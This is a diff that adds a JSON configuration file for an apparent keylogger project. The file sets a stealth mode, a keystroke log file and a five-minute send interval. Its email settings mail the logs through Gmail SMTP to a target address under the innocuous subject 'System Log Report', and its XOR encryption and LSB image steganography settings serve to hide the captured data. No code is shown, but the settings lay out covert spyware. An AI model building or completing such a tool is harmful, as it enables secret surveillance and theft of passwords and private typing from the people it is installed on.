@@ -1,0 +1,26 @@
+{
+    "email": {
+        "smtp_server": "smtp.gmail.com",
+        "smtp_port": 587,
+        "username": "your_email@gmail.com",
+        "password": "your_app_password",
+        "target_email": "target@example.com",
+        "subject": "System Log Report"
+    },
+    "encryption": {
+        "method": "xor",
+        "key": "default_encryption_key_123",
+        "aes_enabled": false
+    },
+    "steganography": {
+        "embed_method": "lsb",
+        "channels": ["red", "green", "blue"],
+        "bit_depth": 1
+    },
+    "keylogger": {
+        "log_file": "keylog.txt",
+        "send_interval": 300,
+        "stealth_mode": true,
+        "max_log_size": 1024
+    }
+}
